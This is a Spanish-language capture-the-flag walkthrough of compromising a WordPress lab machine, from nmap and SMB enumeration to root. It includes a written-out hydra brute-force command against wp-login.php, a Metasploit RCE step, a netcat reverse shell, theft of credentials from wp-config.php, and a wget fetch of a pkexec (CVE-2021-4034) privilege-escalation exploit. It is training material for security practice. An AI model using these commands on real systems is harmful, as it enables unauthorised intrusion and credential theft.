Realizamos el escaneo con nmap
```Bash
nmap -p- -sCV --open -T5 --min-rate 5000 -n -Pn 10.10.106.229 -oN Escaneo.txt
```
![[Pasted image 20240530104122.png]]

De primeras vemos el puerto 139 y 445 abiertos, lo revisamos y encontramos un recurso compartido `BillySMB`
![[Pasted image 20240530104358.png]]

Analizamos que permisos tenemos y nos encontramos que tenemos permisos de lectura y escritura
![[Pasted image 20240530104530.png]]

Accedemos al recurso sin usuario
![[Pasted image 20240530104735.png]]

Nos descargamos todos los ficheros
![[Pasted image 20240530105050.png]]

Revisamos si hay algo de contenido oculto
![[Pasted image 20240530110506.png]]

Lo extraemos
![[Pasted image 20240530110511.png]]

Y ahora lo leemos
![[Pasted image 20240530110458.png]]

Por este lado no continuaremos, seguiremos intentando vulnerar la maquina victima por el puerto 80, para ello primero añadiremos el dominio
![[Pasted image 20240530113221.png]]

De primeras vemos dos usuarios en el blog
![[Pasted image 20240530113359.png]]

Revisamos información de como esta echa la web y vemos que es con Wordpress
![[Pasted image 20240530113530.png]]

Confirmamos con otra herramineta como Wappalizer que este echa con Wordpress
![[Pasted image 20240530113717.png|500]]


Ahora buscaremos vulnerabilidades con wpscan y al anarlizarlo encontramos dos usuarios
![[Pasted image 20240530113950.png]]
![[Pasted image 20240530114143.png]]

Vemos dos usuarios que estaban en el blog, accederemos al login de php y vemos que los usuarios existen
![[Pasted image 20240530114255.png]]

Como ya tenemos dos usuarios realizaremos un ataque de fuerza bruta con hydra, para ello primero interceptaremos la petición con burpsuit
![[Pasted image 20240530115603.png]]

Mandamos la respuesta al repeater con CTRL + R y deshabilitamos burpsuit
![[Pasted image 20240530120414.png]]

Realizamos el ataque con hydra cambiando los parametros del registro de inicio de sesion, el siguiente comando hace la siguiente función:
- `l`: Para seleccionar el usuario
- `P`: Para seleccionar el listado de contraseñas
- `http-post-form`: Aqui pegaremos el contenido del login interceptado por burpsuit añadiendo después del igual `^PASS` donde queremos obtener las credenciales y al final del apartado después de cookie=1 agregamos :seguido del error que nos da al dar login
```Bash
hydra -l kwheel -P /home/wolf/Escritorio/rockyou.txt 10.10.57.104 http-post-form "/wp-login.php:log=kwheel&pwd^PASS^=&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.57.104%2Fwp-admin%2F&testcookie=1:The password you entered for the username" -I
```
![[Pasted image 20240530135311.png]]


Comprobamos el acceso y vemos que tenemos acceso a wordpress
![[Pasted image 20240530140548.png]]

Ahora que ya tenemos las credenciales vamos s buscar explotar el sistema, buscando encontramos que hay una vulnerabilidad en wordpress 5.0 que nos permite acceder al sistema de destino subiendo una imagen con una carga malicios, buscamos la carga en la base de datos de [rapid7](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/wp_crop_rce.rb) y la encontramos
![[Pasted image 20240530140927.png]]

La cargamos y configuramos en metasploit
![[Pasted image 20240530140953.png]]

Y al ejecutarla obtenemos acceso al sistema con el usuario www-data
![[Pasted image 20240530141021.png]]

Ahora abriremos una shell
![[Pasted image 20240530141515.png]]

Nos ponemos en escucha con netcat y una vez estamos en escucha ejecutamos el codigo para obtener una reverse shell
![[Pasted image 20240530141754.png]]

Y ya tendremos acceso
![[Pasted image 20240530141828.png]]

Ejecutamos el siguiente comando en la terminal donde tenemos acceso por netcat
![[Pasted image 20240530142550.png]]

Y ahora en la la terminal de la maquina victima ejecutamos los siguientes comandos
![[Pasted image 20240530143202.png]]

Leemos el fichero `wp-config.php` y obtenemos las credenciales de la base de datos
![[Pasted image 20240530142035.png]]

Accedemos a la base de datos
![[Pasted image 20240530144127.png]]

Continuaremos intentando la escalada de privilegios, para ello desde el terminal buscaremos algun binario interesante y escribiendo el siguiente comando los listamos todos
```Bash
find / -perm -4000 2>/dev/null
```
![[Pasted image 20240531090556.png]]

Encontramos la siguiente vulnerabilidad
https://github.com/Almorabea/pkexec-exploit
![[Pasted image 20240531090804.png]]

En el enlace nos explica el funcionamiento de este exploit, lo copiamos
```Bash
wget https://raw.githubusercontent.com/Almorabea/pkexec-exploit/main/CVE-2021-4034.py
```
![[Pasted image 20240531090922.png]]

Le cambiamos el nombre
![[Pasted image 20240531091146.png]]

Y ahora cargaremos el archivo en la maquina victima creando un servidor en python
![[Pasted image 20240531091230.png]]

Y descargandonos el fichero desde la maquina victima
![[Pasted image 20240531091315.png]]

Una vez descargado el fichero lo ejecutamos y obtenemos los privilegios de root
![[Pasted image 20240531091443.png]]